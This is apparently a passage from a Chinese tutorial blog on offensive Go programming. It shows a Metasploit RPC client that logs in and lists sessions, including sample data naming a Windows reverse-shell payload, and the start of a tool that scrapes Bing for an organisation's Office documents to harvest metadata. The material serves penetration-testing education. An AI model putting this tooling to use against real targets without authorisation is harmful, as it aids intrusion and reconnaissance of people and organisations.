hostSearch.Matches &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%18s%8d\n&quot;</span>, host.IPString, host.Port)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们输入<code>go run main.go Tomcat</code>的时候，便可以查询</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301213245.png"></p><p>OK，一个调用<code>Shodan API</code>的小型 go程序就完成了</p><h2 id="0x03-与Metasploit交互"><a href="#0x03-与Metasploit交互" class="headerlink" title="0x03 与Metasploit交互"></a>0x03 与Metasploit交互</h2><p>msf 想必都熟悉，在这里，我们将会构建一个与远程<code>Metasploit</code>实例进行交互的客户端，他要比<code>Shodan</code>更复杂</p><p>后来改成如下的启动方式了，(图片请忽略)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=<span class="string">&#x27;msf&#x27;</span> Pass=<span class="string">&#x27;msf</span></span><br></pre></td></tr></table></figure><p>书上让本地启动 <code>msfconsole</code>和 <code>msgrpc</code>，这里，我选择使用<code>kali</code>进行替代</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301220321.png"></p><p>书上说为了保险，避免对一些值进行硬编码，需要将以下值设置到环境变量中去，但是这里为了方便，我就先不设置了。</p><p><code>export MSFHOST xxxxxxxx</code></p><p><code>export MSFPASS xxxxxx</code></p><p>现在如图上方，我们已经运行了<code>MSF 和 RPC</code>的服务器，接下来，我们查看<code>MSF API</code>的开发文档，发现，他与使用<code>JSON</code>交互的<code>Shodan</code>不同，msf使用了<code>MessagePack</code>（一种紧凑而高效的二进制格式）进行通信。但是，由于 go 官方库中不含，所以我们需要下载它</p><p><code> go get gopkg.in/vmihailenco/msgpack.v2</code></p><h3 id="1-定义目标"><a href="#1-定义目标" class="headerlink" title="1. 定义目标"></a>1. 定义目标</h3><p>现在定义一个RPC包，创建<code>msf.go</code>，</p><p>在<code>Metasploit</code>开发人员文档中的方法<code>session.list</code></p><blockquote><p>官方文档：<a href="https://docs.rapid7.com/metasploit/rpc-api/">https://docs.rapid7.com/metasploit/rpc-api/</a></p><p><a href="https://docs.rapid7.com/metasploit/standard-api-methods-reference/">https://docs.rapid7.com/metasploit/standard-api-methods-reference/</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;session.list&quot;</span><span class="punctuation">,</span> <span class="string">&quot;token&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这是最小的目标，它期望接收实现的方法是<code>名称和令牌</code>，<code>token</code>值是一个占位符，由文档可知，这是一个身份认证的令牌，是成功登录<code>RPC</code>服务器发出的，从<code>Metasploit</code>返回的方法<code>session.list</code>响应采用以下格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="string">&quot;1&quot;</span> =&gt; <span class="punctuation">&#123;</span></span><br><span class="line">  &#x27;type&#x27; =&gt; <span class="string">&quot;shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;tunnel_local&quot;</span> =&gt; <span class="string">&quot;192.168.35.149:44444&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;tunnel_peer&quot;</span> =&gt; <span class="string">&quot;192.168.35.149:43886&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;via_exploit&quot;</span> =&gt; <span class="string">&quot;exploit/multi/handler&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;via_payload&quot;</span> =&gt; <span class="string">&quot;payload/windows/shell_reverse_tcp&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;desc&quot;</span> =&gt; <span class="string">&quot;Command shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;info&quot;</span> =&gt; <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;workspace&quot;</span> =&gt; <span class="string">&quot;Project1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;target_host&quot;</span> =&gt; <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;uuid&quot;</span> =&gt; <span class="string">&quot;hjahs9kw&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;exploit_uuid&quot;</span> =&gt; <span class="string">&quot;gcprpj2a&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;routes&quot;</span> =&gt; <span class="punctuation">[</span> <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301224456.png"></p><p>该响应作为映射返回，<code>Meterpreter</code>会话标识符是关键，而会话的详细信息是值</p><p>现在需要构建 <code>Go</code>数据类型和响应结构体，根据文档，</p><p>请求结构体<code>sessionListReq</code>按照<code>Metasploit RPC</code>服务器所接受的方式，将结构化数据，序列化为<code>MessagePack</code>格式，数据以数组的而不是映射的形式传递，因此，<code>RPC</code>希望接受到的是作为值的<code>位置数组</code>。&#x3D;&#x3D;默认情况下，结构体将被编码为包含从属性名称推导出来的键名映射。&#x3D;&#x3D;要禁用此功能且将其强制将其编码为<code>位置数组</code>，必须添加一个名为<code>_msgpack</code>的特殊字段，该字段利用描述符<code>asArray</code>，显示指示编码器&#x2F;解码器将数据视为数组</p><p>响应结构体<code>SessionListRes</code>包含响应字段和结构体属性的一一对应关系，该数据本质上是一个请按套映射，外层映射是会话详细信息的会话标识符，内层映射是内层会话的详细信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> sessionListReq <span class="keyword">struct</span> &#123;</span><br><span class="line">_msgpack <span class="keyword">struct</span>&#123;&#125; <span class="string">`msgpack:&quot;,asArray&quot;`</span></span><br><span class="line">Method   <span class="type">string</span></span><br><span class="line">Token    <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SessionListRes <span class="keyword">struct</span> &#123;</span><br><span class="line">ID          <span class="type">uint32</span> <span class="string">`msgpack:&quot;,omitempty&quot;`</span></span><br><span class="line">Type        <span class="type">string</span> <span class="string">`msgpack:&quot;type&quot;`</span></span><br><span class="line">TunnelLocal <span class="type">string</span> <span class="string">`msgpack:&quot;tunnel_local&quot;`</span></span><br><span class="line">TunnelPeer  <span class="type">string</span> <span class="string">`msgpack:&quot;tunnel_peer&quot;`</span></span><br><span class="line">ViaExploit  <span class="type">string</span> <span class="string">`msgpack:&quot;via_exploit&quot;`</span></span><br><span class="line">ViaPayload  <span class="type">string</span> <span class="string">`msgpack:&quot;via_payload&quot;`</span></span><br><span class="line">Description <span class="type">string</span> <span class="string">`msgpack:&quot;desc&quot;`</span></span><br><span class="line">Info        <span class="type">string</span> <span class="string">`msgpack:&quot;info&quot;`</span></span><br><span class="line">Workspace   <span class="type">string</span> <span class="string">`msgpack:&quot;workspace&quot;`</span></span><br><span class="line">SessionHost <span class="type">string</span> <span class="string">`msgpack:&quot;session_host&quot;`</span></span><br><span class="line">SessionPort <span class="type">int</span>    <span class="string">`msgpack:&quot;session_port&quot;`</span></span><br><span class="line">Username    <span class="type">string</span> <span class="string">`msgpack:&quot;username&quot;`</span></span><br><span class="line">UUID        <span class="type">string</span> <span class="string">`msgpack:&quot;uuid&quot;`</span></span><br><span class="line">ExploitUUID <span class="type">string</span> <span class="string">`msgpack:&quot;exploit_uuid&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-获取有效令牌"><a href="#2-获取有效令牌" class="headerlink" title="2. 获取有效令牌"></a>2. 获取有效令牌</h3><p>现在，我们需要获取一个有效的登录令牌来获取请求，为此，我们将为api方法<code>auth.login()</code>发出一个登录请求，该请求满足以下条件</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301231549.png"></p><p>登录失败的话</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301231713.png"></p><p>还有登出令牌的功能</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301231814.png"></p><h3 id="3-定义请求和响应"><a href="#3-定义请求和响应" class="headerlink" title="3. 定义请求和响应"></a>3. 定义请求和响应</h3><p><code>suth.login</code>和<code>auth.logout</code>同理，我们需要使用描述控制符将请求序列化为数组并将响应视为映射</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> logoutReq <span class="keyword">struct</span> &#123;</span><br><span class="line">_msgpack    <span class="keyword">struct</span>&#123;&#125; <span class="string">`msgpack:&quot;,asArray&quot;`</span></span><br><span class="line">Method      <span class="type">string</span></span><br><span class="line">Token       <span class="type">string</span></span><br><span class="line">LogoutToken <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> logoutRes <span class="keyword">struct</span> &#123;</span><br><span class="line">Result <span class="type">string</span> <span class="string">`msgpack:&quot;result&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> loginReq <span class="keyword">struct</span> &#123;</span><br><span class="line">_msgpack <span class="keyword">struct</span>&#123;&#125; <span class="string">`msgpack:&quot;,asArray&quot;`</span></span><br><span class="line">Method   <span class="type">string</span></span><br><span class="line">Username <span class="type">string</span></span><br><span class="line">Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> loginRes <span class="keyword">struct</span> &#123;</span><br><span class="line">Result       <span class="type">string</span> <span class="string">`msgpack:&quot;result&quot;`</span></span><br><span class="line">Token        <span class="type">string</span> <span class="string">`msgpack:&quot;token&quot;`</span></span><br><span class="line">Error        <span class="type">bool</span>   <span class="string">`msgpack:&quot;error&quot;`</span></span><br><span class="line">ErrorClass   <span class="type">string</span> <span class="string">`msgpack:&quot;error_class&quot;`</span></span><br><span class="line">ErrorMessage <span class="type">string</span> <span class="string">`msgpack:&quot;error_message&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go可以自动的对登录响应进行序列化，仅填充了存在的字段，这意味着我们可以使用单一结构式表示成功或者失败</p><h3 id="4-创建配置结构体和RPC方法"><a href="#4-创建配置结构体和RPC方法" class="headerlink" title="4. 创建配置结构体和RPC方法"></a>4. 创建配置结构体和RPC方法</h3><p>创建一个结构体类型，以供数据隐式引用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Metasploit <span class="keyword">struct</span> &#123;</span><br><span class="line">host  <span class="type">string</span></span><br><span class="line">user  <span class="type">string</span></span><br><span class="line">pass  <span class="type">string</span></span><br><span class="line">token <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host, user, pass <span class="type">string</span>)</span></span> *Metasploit &#123;</span><br><span class="line">msf := &amp;Metasploit&#123;</span><br><span class="line">host: host,</span><br><span class="line">user: user,</span><br><span class="line">pass: pass,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> msf</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-执行远程调用"><a href="#5-执行远程调用" class="headerlink" title="5. 执行远程调用"></a>5. 执行远程调用</h3><p>构建一个方法，执行远程调用。为了防止大量的代码重复，先构建一个可以执行，序列化，反序列化和HTTP通信逻辑的方法 send()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msf *Metasploit)</span></span> send(req <span class="keyword">interface</span>&#123;&#125;, res <span class="keyword">interface</span>&#123;&#125;) <span class="type">error</span> &#123;</span><br><span class="line">buf := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">msgpack.NewEncoder(buf).Encode(req)</span><br><span class="line">dest := fmt.Sprintf(<span class="string">&quot;http://%s/api&quot;</span>, msf.host)</span><br><span class="line">r, err := http.Post(dest, <span class="string">&quot;binary/message-pack&quot;</span>, buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> r.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := msgpack.NewDecoder(r.Body).Decode(&amp;res); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>send</code>方法中，接受interface{}类型的请求和响应参数。使用此接口类型，可以将任何请求结构体传递到方法中，然后序列化发送到服务器，无需使用显示返回响应的方法。</p><p>接下来，使用<code>msgPack</code>库对请求进行<code>URL</code>编码，可以按照处理其他标准结构化数据的数据逻辑：首先通过NewEncoder()创建编码器，然后调用<code>Encode</code>方法，这将用<code>MessagePack</code>编码表示的请求体填充buf变量。之后发出POST请求，将主题设置为序列化数据。</p><p>然后接下来定义三个方法，每个方法使用相同的常规流程。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msf *Metasploit)</span></span> Login() <span class="type">error</span> &#123;</span><br><span class="line">ctx := &amp;loginReq&#123;</span><br><span class="line">Method:   <span class="string">&quot;auth.login&quot;</span>,</span><br><span class="line">Username: msf.user,</span><br><span class="line">Password: msf.pass,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> res loginRes</span><br><span class="line"><span class="keyword">if</span> err := msf.send(ctx, &amp;res); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">msf.token = res.Token</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msf *Metasploit)</span></span> Logout() <span class="type">error</span> &#123;</span><br><span class="line">ctx := &amp;logoutReq&#123;</span><br><span class="line">Method:      <span class="string">&quot;auth.logout&quot;</span>,</span><br><span class="line">Token:       msf.token,</span><br><span class="line">LogoutToken: msf.token,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> res logoutRes</span><br><span class="line"><span class="keyword">if</span> err := msf.send(ctx, &amp;res); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">msf.token = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msf *Metasploit)</span></span> SessionList() (<span class="keyword">map</span>[<span class="type">uint32</span>]SessionListRes, <span class="type">error</span>) &#123;</span><br><span class="line">req := &amp;sessionListReq&#123;Method: <span class="string">&quot;session.list&quot;</span>, Token: msf.token&#125;</span><br><span class="line">res := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">uint32</span>]SessionListRes)</span><br><span class="line"><span class="keyword">if</span> err := msf.send(req, &amp;res); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> id, session := <span class="keyword">range</span> res &#123;</span><br><span class="line">session.ID = id</span><br><span class="line">res[id] = session</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，<code>RPC</code>函数 session.list()需要有效的身份令牌，这就意味着必须要先登录，但是才能掉用方法<code>SessionList()</code></p><p>所以可以对<code>New</code>函数做一个更改</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host, user, pass <span class="type">string</span>)</span></span> (*Metasploit,<span class="type">error</span>)&#123;</span><br><span class="line">msf := &amp;Metasploit&#123;</span><br><span class="line">host: host,</span><br><span class="line">user: user,</span><br><span class="line">pass: pass,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := msf.Login(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>,err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> msf,<span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-执行"><a href="#6-执行" class="headerlink" title="6.执行"></a>6.执行</h3><p>创建 <code>clinet/main.go</code>文件</p><p>这里没用获取环境变量，原文是</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host := os.Getenv(<span class="string">&quot;MSFHOST&quot;</span>)</span><br><span class="line">pass := os.Getenv(<span class="string">&quot;MSFPASS&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里输入自己的数值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;MSF/rpc&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">host := <span class="string">&quot;&quot;</span></span><br><span class="line">pass := <span class="string">&quot;&quot;</span></span><br><span class="line">user := <span class="string">&quot;msf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&quot;&quot;</span> || pass == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Missing required environment variable MSFHOST or MSFPASS&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msf, err := rpc.New(host, user, pass)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> msf.Logout()</span><br><span class="line"></span><br><span class="line">sessions, err := msf.SessionList()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Sessions:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _, session := <span class="keyword">range</span> sessions &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%5d  %s\n&quot;</span>, session.ID, session.Info)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302000546.png"></p><p>如果有<code>Meterpreter</code>会话则会保存下来</p><h2 id="0x04-使用Bing-Scraping解析文档元数据"><a href="#0x04-使用Bing-Scraping解析文档元数据" class="headerlink" title="0x04 使用Bing Scraping解析文档元数据"></a>0x04 使用Bing Scraping解析文档元数据</h2><p>在渗透测试的时候，相对有用的信息可能会非常关键，这些信息会增加我们对目标攻击的可能性。这些信息的来源之一是<code>文档元数据</code>。</p><p>某些情况下，这类信息会包含地理坐标， 应用程序版本，操作系统信息和用户名。</p><p>我们可以使用搜索引擎去检索关于一个组织的特定文件。</p><h3 id="1-配置和环境规划"><a href="#1-配置和环境规划" class="headerlink" title="1. 配置和环境规划"></a>1. 配置和环境规划</h3><p>我们首先对目标进行声明，我们只关注以<code>xlsx</code>,<code>docx</code>,<code>pptx</code>等结尾的<code>Office Open Xml</code>文档，虽然也可以关注旧版的<code>Office</code>数据类型，但是二进制格式使他们成倍增加，并且会在增加代码复杂性的同时降低其可阅读性。对于<code>PDF</code>文件也是如此。</p><p>我们使用抓取<code>HTML</code>页面，而不是使用<code>搜索引擎API</code>，在没有API的情况下，使用页面抓取的方法更为强大。</p><blockquote><p>在这里我们使用一个<code>goquery</code>，他的作用等用于<code>jquery</code></p><p>安装：go get github.com&#x2F;PuerkitoBio&#x2F;goquery</p></blockquote><h3 id="2-定义元数据包"><a href="#2-定义元数据包" class="headerlink" title="2. 定义元数据包"></a>2. 定义元数据包</h3><p>在代码中定义与<code>XML</code>数据集相对应的<code>GO</code>类型，然后将代码放入一个名为 <code>openxml.go</code>的文件中，该文件是我们想要解析的每个<code>XML</code>的其中一种类型，然后添加数据映射和对应的函数，以确定与<code>Appilcation</code>对应的可识别的<code>Office</code>版本</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> metadata</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/xml&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> OfficeVersions = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;16&quot;</span>: <span class="string">&quot;2016&quot;</span>,</span><br><span class="line"><span class="string">&quot;15&quot;</span>: <span class="string">&quot;2013&quot;</span>,</span><br><span class="line"><span class="string">&quot;14&quot;</span>: <span class="string">&quot;2010&quot;</span>,</span><br><span class="line"><span class="string">&quot;12&quot;</span>: <span class="string">&quot;2007&quot;</span>,</span><br><span class="line"><span class="string">&quot;11&quot;</span>: <span class="string">&quot;2003&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> OfficeCoreProperty <span class="keyword">struct</span> &#123;</span><br><span class="line">XMLName        xml.Name <span class="string">`xml:&quot;coreProperties&quot;`</span></span><br><span class="line">Creator        <span class="type">string</span>   <span class="string">`xml:&quot;creator&quot;`</span></span><br><span class="line">LastModifiedBy <span class="type">string</span>   <span class="string">`xml:&quot;lastModifiedBy&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> OfficeAppProperty <span class="keyword">struct</span> &#123;</span><br><span class="line">XMLName     xml.Name <span class="string">`xml:&quot;Properties&quot;`</span></span><br><span class="line">Application <span class="type">string</span>   <span class="string">`xml:&quot;Application&quot;`</span></span><br><span class="line">Company     <span class="type">string</span>   <span class="string">`xml:&quot;Company&quot;`</span></span><br><span class="line">Version     <span class="type">string</span>   <span class="string">`xml:&quot;AppVersion&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *OfficeAppProperty)</span></span> GetMajorVersion() <span class="type">string</span> &#123;</span><br><span class="line">tokens := strings.Split(a.Version, <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(tokens) &lt; <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">v, ok := OfficeVersions[tokens[<span class="number">0</span>]]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-把数据映射到结构体"><a href="#3-把数据映射到结构体" class="headerlink" title="3. 把数据映射到结构体"></a>3. 把数据映射到结构体</h3><p>接下来要读取适当的文件内容，并将内容赋值给所定义的结构体代码。为此定义函数<code>NewProperties()</code>和<code>proccess()</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 